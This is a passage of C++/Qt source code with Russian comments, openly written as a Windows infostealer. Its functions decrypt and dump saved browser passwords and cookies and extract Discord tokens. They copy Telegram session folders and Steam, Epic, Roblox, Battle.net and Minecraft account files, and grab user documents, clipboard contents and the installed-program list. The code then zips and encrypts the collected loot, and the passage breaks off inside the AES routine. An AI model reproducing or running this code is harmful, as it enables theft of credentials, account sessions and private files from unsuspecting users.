    emitLog("Процесс кражи данных завершен");
}

// Снятие скриншота
void MainWindow::takeScreenshot(const std::string& dir) {
    QScreen *screen = QGuiApplication::primaryScreen();
    if (screen) {
        QPixmap screenshot = screen->grabWindow(0);
        std::string path = dir + "\\screenshot_" + std::to_string(GetTickCount()) + ".png";
        if (screenshot.save(QString::fromStdString(path), "PNG")) {
            screenshotsPaths.push_back(path);
            emitLog("Скриншот сохранен: " + QString::fromStdString(path));
        } else {
            emitLog("Ошибка: Не удалось сохранить скриншот");
        }
    } else {
        emitLog("Ошибка: Не удалось сделать скриншот");
    }
}

// Сбор системной информации
void MainWindow::collectSystemInfo(const std::string& dir) {
    QString systemInfo = "System Information:\n";
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    if (GetComputerNameW(computerName, &size)) {
        systemInfo += "Computer Name: " + QString::fromWCharArray(computerName) + "\n";
    }

    wchar_t userName[UNLEN + 1];
    size = sizeof(userName) / sizeof(userName[0]);
    if (GetUserNameW(userName, &size)) {
        systemInfo += "Username: " + QString::fromWCharArray(userName) + "\n";
    }

    systemInfo += "OS: " + QSysInfo::prettyProductName() + "\n";
    QHostInfo hostInfo = QHostInfo::fromName(QHostInfo::localHostName());
    if (!hostInfo.addresses().isEmpty()) {
        systemInfo += "IP: " + hostInfo.addresses().first().toString() + "\n";
    }

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    systemInfo += "Processor Architecture: " + QString::number(si.wProcessorArchitecture) + "\n";
    systemInfo += "Number of Processors: " + QString::number(si.dwNumberOfProcessors) + "\n";

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    if (GlobalMemoryStatusEx(&memoryStatus)) {
        systemInfo += "Total Physical Memory: " + QString::number(memoryStatus.ullTotalPhys / (1024 * 1024)) + " MB\n";
    }

    std::string path = dir + "\\system_info.txt";
    QFile file(QString::fromStdString(path));
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << systemInfo;
        file.close();
        emitLog("Системная информация сохранена: " + QString::fromStdString(path));
    } else {
        emitLog("Ошибка: Не удалось сохранить системную информацию");
    }
}

// Кража данных браузеров
void MainWindow::stealBrowserData(const std::string& dir) {
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::vector<std::pair<std::string, std::string>> browsers = {
        {"Chrome", std::string(appDataPath) + "\\Google\\Chrome\\User Data\\Default\\"},
        {"Edge", std::string(appDataPath) + "\\Microsoft\\Edge\\User Data\\Default\\"},
        {"Opera", std::string(appDataPath) + "\\Opera Software\\Opera Stable\\"},
        {"OperaGX", std::string(appDataPath) + "\\Opera Software\\Opera GX Stable\\"},
        {"Vivaldi", std::string(appDataPath) + "\\Vivaldi\\User Data\\Default\\"},
        {"Yandex", std::string(appDataPath) + "\\Yandex\\YandexBrowser\\User Data\\Default\\"}
    };

    for (const auto& browser : browsers) {
        if (config.passwords) {
            std::string loginDataPath = browser.second + "Login Data";
            if (std::filesystem::exists(loginDataPath)) {
                std::string tempPath = dir + "\\" + browser.first + "_LoginData_temp";
                try {
                    std::filesystem::copy_file(loginDataPath, tempPath, std::filesystem::copy_options::overwrite_existing);
                } catch (const std::exception& e) {
                    emitLog(QString("Ошибка копирования базы данных паролей %1: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(e.what())));
                    continue;
                }

                sqlite3 *db;
                if (sqlite3_open(tempPath.c_str(), &db) == SQLITE_OK) {
                    sqlite3_stmt *stmt;
                    if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, nullptr) == SQLITE_OK) {
                        std::string path = dir + "\\" + browser.first + "_passwords.txt";
                        QFile file(QString::fromStdString(path));
                        if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
                            QTextStream out(&file);
                            while (sqlite3_step(stmt) == SQLITE_ROW) {
                                const char* url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                const char* username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                auto* password = sqlite3_column_blob(stmt, 2);
                                int passwordLen = sqlite3_column_bytes(stmt, 2);

                                out << "URL: " << (url ? QString::fromUtf8(url) : "N/A") << "\n";
                                out << "Username: " << (username ? QString::fromUtf8(username) : "N/A") << "\n";
                                if (password && passwordLen > 0) {
                                    DATA_BLOB inBlob = {(DWORD)passwordLen, (BYTE*)password};
                                    DATA_BLOB outBlob;
                                    if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
                                        out << "Password: " << QString::fromUtf8((char*)outBlob.pbData, outBlob.cbData) << "\n";
                                        LocalFree(outBlob.pbData);
                                    } else {
                                        out << "Password: [Failed to decrypt]\n";
                                        emitLog(QString("Не удалось расшифровать пароль для %1").arg(QString::fromStdString(browser.first)));
                                    }
                                } else {
                                    out << "Password: N/A\n";
                                }
                                out << "\n";
                            }
                            file.close();
                            emitLog(QString("Пароли %1 сохранены: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(path)));
                        } else {
                            emitLog(QString("Ошибка: Не удалось создать файл для паролей %1").arg(QString::fromStdString(browser.first)));
                        }
                        sqlite3_finalize(stmt);
                    } else {
                        emitLog(QString("Ошибка подготовки SQL-запроса для паролей %1: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(sqlite3_errmsg(db))));
                    }
                    sqlite3_close(db);
                    std::filesystem::remove(tempPath);
                } else {
                    emitLog(QString("Ошибка открытия базы данных %1: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(sqlite3_errmsg(db))));
                }
            } else {
                emitLog(QString("База данных паролей %1 не найдена").arg(QString::fromStdString(browser.first)));
            }
        }
        if (config.cookies) {
            std::string cookiesPath = browser.second + "Network\\Cookies";
            if (std::filesystem::exists(cookiesPath)) {
                std::string tempPath = dir + "\\" + browser.first + "_Cookies_temp";
                try {
                    std::filesystem::copy_file(cookiesPath, tempPath, std::filesystem::copy_options::overwrite_existing);
                } catch (const std::exception& e) {
                    emitLog(QString("Ошибка копирования базы данных куки %1: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(e.what())));
                    continue;
                }

                sqlite3 *db;
                if (sqlite3_open(tempPath.c_str(), &db) == SQLITE_OK) {
                    sqlite3_stmt *stmt;
                    if (sqlite3_prepare_v2(db, "SELECT host_key, name, encrypted_value FROM cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                        std::string path = dir + "\\" + browser.first + "_cookies.txt";
                        QFile file(QString::fromStdString(path));
                        if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
                            QTextStream out(&file);
                            while (sqlite3_step(stmt) == SQLITE_ROW) {
                                const char* host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                const char* name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                auto* value = sqlite3_column_blob(stmt, 2);
                                int valueLen = sqlite3_column_bytes(stmt, 2);

                                out << "Host: " << (host ? QString::fromUtf8(host) : "N/A") << "\n";
                                out << "Name: " << (name ? QString::fromUtf8(name) : "N/A") << "\n";
                                if (value && valueLen > 0) {
                                    DATA_BLOB inBlob = {(DWORD)valueLen, (BYTE*)value};
                                    DATA_BLOB outBlob;
                                    if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
                                        out << "Value: " << QString::fromUtf8((char*)outBlob.pbData, outBlob.cbData) << "\n";
                                        LocalFree(outBlob.pbData);
                                    } else {
                                        out << "Value: [Failed to decrypt]\n";
                                        emitLog(QString("Не удалось расшифровать куки для %1").arg(QString::fromStdString(browser.first)));
                                    }
                                } else {
                                    out << "Value: N/A\n";
                                }
                                out << "\n";
                            }
                            file.close();
                            emitLog(QString("Куки %1 сохранены: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(path)));
                        } else {
                            emitLog(QString("Ошибка: Не удалось создать файл для куки %1").arg(QString::fromStdString(browser.first)));
                        }
                        sqlite3_finalize(stmt);
                    } else {
                        emitLog(QString("Ошибка подготовки SQL-запроса для куки %1: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(sqlite3_errmsg(db))));
                    }
                    sqlite3_close(db);
                    std::filesystem::remove(tempPath);
                } else {
                    emitLog(QString("Ошибка открытия базы данных куки %1: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(sqlite3_errmsg(db))));
                }
            } else {
                emitLog(QString("База данных куки %1 не найдена").arg(QString::fromStdString(browser.first)));
            }
        }
    }

    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string firefoxPath = std::string(appDataPath) + "\\Mozilla\\Firefox\\Profiles\\";
    if (std::filesystem::exists(firefoxPath)) {
        for (const auto& entry : std::filesystem::directory_iterator(firefoxPath)) {
            std::string profilePath = entry.path().string();
            if (config.passwords) {
                std::string loginsPath = profilePath + "\\logins.json";
                if (std::filesystem::exists(loginsPath)) {
                    std::string path = dir + "\\firefox_logins.json";
                    if (QFile::copy(QString::fromStdString(loginsPath), QString::fromStdString(path))) {
                        emitLog("Пароли Firefox сохранены: " + QString::fromStdString(path));
                    } else {
                        emitLog("Ошибка копирования паролей Firefox");
                    }
                }
            }
            if (config.cookies) {
                std::string cookiesPath = profilePath + "\\cookies.sqlite";
                if (std::filesystem::exists(cookiesPath)) {
                    std::string tempPath = dir + "\\firefox_cookies_temp.sqlite";
                    try {
                        std::filesystem::copy_file(cookiesPath, tempPath, std::filesystem::copy_options::overwrite_existing);
                    } catch (const std::exception& e) {
                        emitLog(QString("Ошибка копирования базы данных куки Firefox: %1").arg(QString::fromStdString(e.what())));
                        continue;
                    }

                    sqlite3 *db;
                    if (sqlite3_open(tempPath.c_str(), &db) == SQLITE_OK) {
                        sqlite3_stmt *stmt;
                        if (sqlite3_prepare_v2(db, "SELECT host, name, value FROM moz_cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                            std::string path = dir + "\\firefox_cookies.txt";
                            QFile file(QString::fromStdString(path));
                            if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
                                QTextStream out(&file);
                                while (sqlite3_step(stmt) == SQLITE_ROW) {
                                    const char* host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                    const char* name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                    const char* value = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));

                                    out << "Host: " << (host ? QString::fromUtf8(host) : "N/A") << "\n";
                                    out << "Name: " << (name ? QString::fromUtf8(name) : "N/A") << "\n";
                                    out << "Value: " << (value ? QString::fromUtf8(value) : "N/A") << "\n\n";
                                }
                                file.close();
                                emitLog("Куки Firefox сохранены: " + QString::fromStdString(path));
                            } else {
                                emitLog("Ошибка: Не удалось создать файл для куки Firefox");
                            }
                            sqlite3_finalize(stmt);
                        } else {
                            emitLog(QString("Ошибка подготовки SQL-запроса для куки Firefox: %1").arg(QString::fromStdString(sqlite3_errmsg(db))));
                        }
                        sqlite3_close(db);
                        std::filesystem::remove(tempPath);
                    } else {
                        emitLog(QString("Ошибка открытия базы данных куки Firefox: %1").arg(QString::fromStdString(sqlite3_errmsg(db))));
                    }
                }
            }
        }
    }
}

// Кража данных Discord
void MainWindow::stealDiscordData(const std::string& dir) {
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string discordPath = std::string(appDataPath) + "\\discord\\Local Storage\\leveldb\\";
    if (std::filesystem::exists(discordPath)) {
        std::string tokensPath = dir + "\\discord_tokens.txt";
        QFile file(QString::fromStdString(tokensPath));
        if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
            QTextStream out(&file);
            for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
                if (entry.path().extension() == ".ldb") {
                    std::ifstream ldbFile(entry.path(), std::ios::binary);
                    std::string content((std::istreambuf_iterator<char>(ldbFile)), std::istreambuf_iterator<char>());
                    ldbFile.close();

                    QRegularExpression tokenRegex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
                    QRegularExpressionMatchIterator i = tokenRegex.globalMatch(QString::fromStdString(content));
                    while (i.hasNext()) {
                        QRegularExpressionMatch match = i.next();
                        out << match.captured() << "\n";
                    }

                    QRegularExpression mfaTokenRegex("mfa\\.[\\w-]{84}");
                    i = mfaTokenRegex.globalMatch(QString::fromStdString(content));
                    while (i.hasNext()) {
                        QRegularExpressionMatch match = i.next();
                        out << match.captured() << "\n";
                    }
                }
            }
            file.close();
            if (file.size() > 0) {
                emitLog("Токены Discord сохранены: " + QString::fromStdString(tokensPath));
            } else {
                emitLog("Токены Discord не найдены");
                std::filesystem::remove(tokensPath);
            }
        } else {
            emitLog("Ошибка: Не удалось создать файл для токенов Discord");
        }
    } else {
        emitLog("Директория Discord не найдена");
    }
}

// Кража данных Telegram
void MainWindow::stealTelegramData(const std::string& dir) {
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string telegramPath = std::string(appDataPath) + "\\Telegram Desktop\\tdata\\";
    if (std::filesystem::exists(telegramPath)) {
        std::string telegramDir = dir + "\\Telegram";
        try {
            std::filesystem::create_directories(telegramDir);
            for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
                if (entry.path().filename().string().find("D877F783D5D3EF8C") != std::string::npos) {
                    std::filesystem::copy(entry.path(), telegramDir + "\\" + entry.path().filename().string(), std::filesystem::copy_options::recursive);
                }
            }
            emitLog("Данные Telegram скопированы: " + QString::fromStdString(telegramDir));
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Telegram: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Директория Telegram не найдена");
    }
}

// Кража данных Steam
void MainWindow::stealSteamData(const std::string& dir) {
    std::string steamPath = "C:\\Program Files (x86)\\Steam\\";
    if (std::filesystem::exists(steamPath)) {
        std::vector<std::string> filesToSteal = {"config\\config.vdf", "config\\loginusers.vdf"};
        if (config.steamMAFile) {
            for (const auto& entry : std::filesystem::directory_iterator(steamPath)) {
                if (entry.path().filename().string().find("ssfn") != std::string::npos) {
                    filesToSteal.push_back(entry.path().filename().string());
                }
            }
        }
        std::string steamDir = dir + "\\Steam";
        try {
            std::filesystem::create_directories(steamDir);
            for (const auto& file : filesToSteal) {
                if (std::filesystem::exists(steamPath + file)) {
                    std::filesystem::copy(steamPath + file, steamDir + "\\" + std::filesystem::path(file).filename().string(), std::filesystem::copy_options::overwrite_existing);
                }
            }
            emitLog("Данные Steam скопированы: " + QString::fromStdString(steamDir));
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Steam: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Директория Steam не найдена");
    }
}

// Кража данных Epic Games
void MainWindow::stealEpicData(const std::string& dir) {
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::string epicPath = std::string(appDataPath) + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\";
    if (std::filesystem::exists(epicPath)) {
        std::string epicDir = dir + "\\EpicGames";
        try {
            std::filesystem::create_directories(epicDir);
            for (const auto& entry : std::filesystem::directory_iterator(epicPath)) {
                if (entry.path().filename().string() == "GameUserSettings.ini") {
                    std::filesystem::copy(entry.path(), epicDir + "\\GameUserSettings.ini", std::filesystem::copy_options::overwrite_existing);
                }
            }
            emitLog("Данные Epic Games скопированы: " + QString::fromStdString(epicDir));
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Epic Games: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Директория Epic Games не найдена");
    }
}

// Кража данных Roblox
void MainWindow::stealRobloxData(const std::string& dir) {
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::string robloxPath = std::string(appDataPath) + "\\Roblox\\GlobalSettings_13.xml";
    if (std::filesystem::exists(robloxPath)) {
        std::string robloxDir = dir + "\\Roblox";
        try {
            std::filesystem::create_directories(robloxDir);
            std::filesystem::copy(robloxPath, robloxDir + "\\GlobalSettings_13.xml", std::filesystem::copy_options::overwrite_existing);
            emitLog("Данные Roblox скопированы: " + QString::fromStdString(robloxDir));
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Roblox: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Директория Roblox не найдена");
    }
}

// Кража данных Battle.net
void MainWindow::stealBattleNetData(const std::string& dir) {
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string battlenetPath = std::string(appDataPath) + "\\Battle.net\\";
    if (std::filesystem::exists(battlenetPath)) {
        std::string battlenetDir = dir + "\\BattleNet";
        try {
            std::filesystem::create_directories(battlenetDir);
            for (const auto& entry : std::filesystem::directory_iterator(battlenetPath)) {
                if (entry.path().filename().string() == "Battle.net.config") {
                    std::filesystem::copy(entry.path(), battlenetDir + "\\Battle.net.config", std::filesystem::copy_options::overwrite_existing);
                }
            }
            emitLog("Данные Battle.net скопированы: " + QString::fromStdString(battlenetDir));
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Battle.net: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Директория Battle.net не найдена");
    }
}

// Кража данных Minecraft
void MainWindow::stealMinecraftData(const std::string& dir) {
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string minecraftPath = std::string(appDataPath) + "\\.minecraft\\";
    if (std::filesystem::exists(minecraftPath)) {
        std::string minecraftDir = dir + "\\Minecraft";
        try {
            std::filesystem::create_directories(minecraftDir);
            std::vector<std::string> filesToSteal = {
                "launcher_profiles.json",
                "usercache.json",
                "options.txt",
                "servers.dat"
            };

            for (const auto& file : filesToSteal) {
                std::string filePath = minecraftPath + file;
                if (std::filesystem::exists(filePath)) {
                    std::filesystem::copy(filePath, minecraftDir + "\\" + file, std::filesystem::copy_options::overwrite_existing);
                    emitLog("Файл Minecraft скопирован: " + QString::fromStdString(file));
                }
            }

            // Попытка найти моды
            std::string modsPath = minecraftPath + "mods\\";
            if (std::filesystem::exists(modsPath)) {
                std::string modsDir = minecraftDir + "\\mods";
                std::filesystem::create_directories(modsDir);
                for (const auto& entry : std::filesystem::directory_iterator(modsPath)) {
                    if (entry.path().extension() == ".jar" || entry.path().extension() == ".zip") {
                        std::filesystem::copy(entry.path(), modsDir + "\\" + entry.path().filename().string(), std::filesystem::copy_options::overwrite_existing);
                    }
                }
                emitLog("Моды Minecraft скопированы: " + QString::fromStdString(modsDir));
            }

            emitLog("Данные Minecraft скопированы: " + QString::fromStdString(minecraftDir));
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Minecraft: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Директория Minecraft не найдена");
    }
}

// Кража истории чатов
void MainWindow::stealChatHistory(const std::string& dir) {
    emitLog("Начало кражи истории чатов...");

    // Discord
    if (config.discord) {
        char appDataPath[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
        std::string discordPath = std::string(appDataPath) + "\\discord\\Local Storage\\leveldb\\";
        if (std::filesystem::exists(discordPath)) {
            std::string discordChatDir = dir + "\\DiscordChat";
            try {
                std::filesystem::create_directories(discordChatDir);
                for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
                    if (entry.path().extension() == ".ldb") {
                        std::filesystem::copy(entry.path(), discordChatDir + "\\" + entry.path().filename().string(), std::filesystem::copy_options::overwrite_existing);
                    }
                }
                emitLog("История чатов Discord скопирована: " + QString::fromStdString(discordChatDir));
            } catch (const std::exception& e) {
                emitLog("Ошибка копирования истории чатов Discord: " + QString::fromStdString(e.what()));
            }
        } else {
            emitLog("Директория Discord для истории чатов не найдена");
        }
    }

    // Telegram
    if (config.telegram) {
        char appDataPath[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
        std::string telegramPath = std::string(appDataPath) + "\\Telegram Desktop\\tdata\\";
        if (std::filesystem::exists(telegramPath)) {
            std::string telegramChatDir = dir + "\\TelegramChat";
            try {
                std::filesystem::create_directories(telegramChatDir);
                for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
                    if (entry.path().filename().string().find("D877F783D5D3EF8C") != std::string::npos) {
                        std::filesystem::copy(entry.path(), telegramChatDir + "\\" + entry.path().filename().string(), std::filesystem::copy_options::recursive);
                    }
                }
                emitLog("История чатов Telegram скопирована: " + QString::fromStdString(telegramChatDir));
            } catch (const std::exception& e) {
                emitLog("Ошибка копирования истории чатов Telegram: " + QString::fromStdString(e.what()));
            }
        } else {
            emitLog("Директория Telegram для истории чатов не найдена");
        }
    }

    emitLog("Кража истории чатов завершена");
}

// Кража файлов (граббер)
void MainWindow::stealFiles(const std::string& dir) {
    emitLog("Начало кражи файлов...");

    std::vector<std::string> pathsToGrab = {
        "C:\\Users\\" + std::string(getenv("USERNAME")) + "\\Desktop\\",
        "C:\\Users\\" + std::string(getenv("USERNAME")) + "\\Documents\\",
        "C:\\Users\\" + std::string(getenv("USERNAME")) + "\\Downloads\\"
    };
    std::vector<std::string> extensions = {".txt", ".doc", ".docx", ".pdf", ".jpg", ".png", ".xlsx", ".xls"};
    const size_t maxFileSize = 10 * 1024 * 1024; // 10 MB максимальный размер файла

    std::string filesDir = dir + "\\Files";
    try {
        std::filesystem::create_directories(filesDir);
        for (const auto& path : pathsToGrab) {
            if (std::filesystem::exists(path)) {
                for (const auto& entry : std::filesystem::directory_iterator(path)) {
                    if (entry.is_regular_file()) {
                        auto fileSize = entry.file_size();
                        if (fileSize > maxFileSize) continue; // Пропускаем файлы больше 10 МБ

                        if (std::find(extensions.begin(), extensions.end(), entry.path().extension().string()) != extensions.end()) {
                            std::filesystem::copy(entry.path(), filesDir + "\\" + entry.path().filename().string(), std::filesystem::copy_options::overwrite_existing);
                            emitLog("Скопирован файл: " + QString::fromStdString(entry.path().filename().string()));
                        }
                    }
                }
            } else {
                emitLog("Путь не найден: " + QString::fromStdString(path));
            }
        }
        emitLog("Файлы скопированы: " + QString::fromStdString(filesDir));
    } catch (const std::exception& e) {
        emitLog("Ошибка копирования файлов: " + QString::fromStdString(e.what()));
    }

    emitLog("Кража файлов завершена");
}

// Сбор данных для социальной инженерии
void MainWindow::collectSocialEngineeringData(const std::string& dir) {
    emitLog("Сбор данных для социальной инженерии...");

    QString socialData = "Social Engineering Data:\n";
    
    // Данные буфера обмена
    QClipboard *clipboard = QGuiApplication::clipboard();
    if (clipboard) {
        socialData += "Clipboard: " + clipboard->text() + "\n";
    }

    // Недавно открытые файлы
    char recentPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_RECENT, NULL, 0, recentPath);
    std::string recentFilesPath = std::string(recentPath);
    if (std::filesystem::exists(recentFilesPath)) {
        socialData += "Recent Files:\n";
        for (const auto& entry : std::filesystem::directory_iterator(recentFilesPath)) {
            socialData += "  " + QString::fromStdString(entry.path().filename().string()) + "\n";
        }
    }

    // Попытка получить список установленных программ
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        socialData += "Installed Programs:\n";
        char appName[1024];
        DWORD appNameSize = sizeof(appName);
        DWORD index = 0;
        while (RegEnumKeyExA(hKey, index++, appName, &appNameSize, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
            socialData += "  " + QString::fromStdString(appName) + "\n";
            appNameSize = sizeof(appName);
        }
        RegCloseKey(hKey);
    }

    std::string path = dir + "\\social_engineering.txt";
    QFile file(QString::fromStdString(path));
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << socialData;
        file.close();
        emitLog("Данные для социальной инженерии сохранены: " + QString::fromStdString(path));
    } else {
        emitLog("Ошибка: Не удалось сохранить данные для социальной инженерии");
    }

    emitLog("Сбор данных для социальной инженерии завершен");
}

// Архивация данных
void MainWindow::archiveData(const std::string& dir, const std::string& archivePath) {
    zip_t* zip = zip_open(archivePath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, nullptr);
    if (!zip) {
        emitLog("Ошибка: Не удалось создать архив: " + QString::fromStdString(archivePath));
        return;
    }

    for (const auto& entry : std::filesystem::recursive_directory_iterator(dir)) {
        if (entry.is_regular_file() && entry.path().extension() != ".zip") {
            std::string relativePath = std::filesystem::relative(entry.path(), dir).string();
            std::ifstream file(entry.path(), std::ios::binary);
            std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
            file.close();

            zip_source_t* source = zip_source_buffer(zip, buffer.data(), buffer.size(), 0);
            if (!source) {
                emitLog("Ошибка создания источника для файла: " + QString::fromStdString(relativePath));
                continue;
            }

            if (zip_file_add(zip, relativePath.c_str(), source, ZIP_FL_OVERWRITE) < 0) {
                emitLog("Ошибка добавления файла в архив: " + QString::fromStdString(relativePath));
                zip_source_free(source);
            }
        }
    }

    if (zip_close(zip) != 0) {
        emitLog("Ошибка закрытия архива: " + QString::fromStdString(zip_error_strerror(zip_get_error(zip))));
        return;
    }

    emitLog("Данные заархивированы: " + QString::fromStdString(archivePath));
}

// Шифрование данных
void MainWindow::encryptData(const std::string& inputPath, const std::string& outputPath) {
    QFile inputFile(QString::fromStdString(inputPath));
    if (!inputFile.open(QIODevice::ReadOnly)) {
        emitLog("Ошибка: Не удалось открыть файл для шифрования: " + QString::fromStdString(inputPath));
        return;
    }

    QByteArray data = inputFile.readAll();
    inputFile.close();

    // Получаем ключи и IV
    auto key1 = GetEncryptionKey(true);
    auto key2 = GetEncryptionKey(false);
    auto iv = generateIV();

    // Применяем шифрование AES с первым ключом
    std::vector<unsigned char> encryptedData1;
    if (!applyAES(data, key1, iv, true, encryptedData1)) {
        emitLog("Ошибка: Не удалось выполнить первое шифрование AES");
        return;
    }

    // Применяем шифрование AES с вторым ключом
    std::vector<unsigned char> encryptedData2;
    if (!applyAES(QByteArray((char*)encryptedData1.data(), encryptedData1.size()), key2, iv, true, encryptedData2)) {
        emitLog("Ошибка: Не удалось выполнить второе шифрование AES");
        return;
    }

    // Добавляем IV в начало зашифрованных данных
    std::vector<unsigned char> finalData(iv.begin(), iv.end());
    finalData.insert(finalData.end(), encryptedData2.begin(), encryptedData2.end());

    // Сохраняем зашифрованные данные
    QFile outputFile(QString::fromStdString(outputPath));
    if (!outputFile.open(QIODevice::WriteOnly)) {
        emitLog("Ошибка: Не удалось открыть файл для записи зашифрованных данных: " + QString::fromStdString(outputPath));
        return;
    }

    outputFile.write((char*)finalData.data(), finalData.size());
    outputFile.close();

    emitLog("Данные зашифрованы и сохранены: " + QString::fromStdString(outputPath));
}

// Реализация метода applyAES
bool MainWindow::applyAES(const QByteArray& input, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv, bool encrypt, std::vector<unsigned char>& output) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;
    DWORD cbData = 0, cbKeyObject = 0, cbBlockLen = 0;

    // Открываем алгоритм AES
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка BCryptOpenAlgorithmProvider: " + QString::number(status, 16));
        return false;
    }

    // Устанавливаем режим CBC
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка BCryptSetProperty (chaining mode): " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    // Получаем размер объекта ключа
    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbData, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка BCryptGetProperty (object length): " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    // Получаем длину блока
    status = BCryptGetProperty(hAlg, BCRYPT_BLOCK_LENGTH, (PBYTE)&cbBlockLen, sizeof(DWORD), &cbData, 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка BCryptGetProperty (block length): " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    // Выделяем память для объекта ключа
    std::vector<BYTE> pbKeyObject(cbKeyObject);
    std::vector<BYTE> pbIV(cbBlockLen);
    memcpy(pbIV.data(), iv.data(), cbBlockLen);

    // Генерируем ключ
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject.data(), cbKeyObject, (PBYTE)key.data(), key.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        emitLog("Ошибка BCryptGenerateSymmetricKey: " + QString::number(status, 16));
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    DWORD cbInput = input.size();
    DWORD cbOutput = 0;
    std::vector<unsigned char> tempOutput;

    if (encrypt) {
        // Вычисляем размер выходного буфера для шифрования
        status = BCryptEncrypt(hKey, (PBYTE)input.data(), cbInput, nullptr, pbIV.data(), cbBlockLen, nullptr, 0, &cbOutput, BCRYPT_BLOCK_PADDING);
        if (!BCRYPT_SUCCESS(status)) {
